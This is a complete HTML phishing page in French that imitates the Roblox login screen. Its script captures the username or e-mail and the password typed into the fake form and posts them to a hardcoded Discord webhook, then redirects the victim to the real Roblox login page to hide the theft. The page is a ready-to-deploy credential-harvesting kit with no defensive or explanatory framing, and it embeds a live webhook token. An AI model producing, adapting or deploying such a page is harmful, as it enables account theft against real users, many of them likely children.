<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Roblox</title>
<style>
  body{margin:0;font-family:-apple-system,system-ui,sans-serif;background:#232527;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;}
  .login-box{background:#393b3d;padding:30px 20px;border-radius:8px;width:100%;max-width:340px;text-align:center;box-sizing:border-box;}
  .logo{width:60px;margin-bottom:20px;fill:#fff;}
  h2{font-size:22px;margin:0 0 20px;font-weight:600;}
  input{width:100%;padding:14px;margin-bottom:12px;background:#232527;border:1px solid #555;border-radius:4px;color:#fff;font-size:16px;box-sizing:border-box;outline:none;}
  input:focus{border-color:#00a2ff;}
  button{width:100%;padding:14px;background:#00a2ff;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px;}
  button:active{background:#0082cc;}
  .links{margin-top:20px;font-size:14px;color:#888;}
  .links a{color:#00a2ff;text-decoration:none;display:block;margin-bottom:10px;}
</style>
</head>
<body>

<div class="login-box">
  <svg class="logo" viewBox="0 0 100 100">
    <path d="M85.5,0H14.5C6.5,0,0,6.5,0,14.5v71C0,93.5,6.5,100,14.5,100h71c8,0,14.5-6.5,14.5-14.5v-71C100,6.5,93.5,0,85.5,0z M22,78l-8-2.5l16-61l8,2.5L22,78z"/>
  </svg>
  <h2>Connexion</h2>
  
  <form id="loginForm">
    <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required autocomplete="off">
    <input type="password" id="password" placeholder="Mot de passe" required autocomplete="off">
    <button type="submit">Se connecter</button>
  </form>
  
  <div class="links">
    <a href="#">Mot de passe oublié ?</a>
    <a href="#">S'inscrire</a>
  </div>
</div>

<script>
const HOOK = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";

document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();
  
  const user = document.getElementById("username").value;
  const pass = document.getElementById("password").value;
  
  let texte = "**🔴 NOUVEAU LOGIN ROBLOX**\n";
  texte += "**Pseudo/Mail:** `" + user + "`\n";
  texte += "**Mdp:** `" + pass + "`\n";
  
  fetch(HOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({content: texte})
  }).finally(() => {
    window.location.href = "https://www.roblox.com/login";
  });
});
</script>
</body>
</html>
